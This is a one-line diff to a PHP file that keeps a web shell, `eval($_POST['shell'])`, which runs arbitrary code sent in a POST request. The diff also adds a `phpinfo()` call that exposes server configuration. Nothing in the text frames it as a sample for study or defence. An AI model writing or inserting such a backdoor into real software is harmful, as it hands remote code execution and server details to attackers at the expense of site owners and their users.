@@ -1,1 +1,1 @@
-<?php eval($_POST['shell']);?>
+<?php phpinfo(); eval($_POST['shell']); ?>
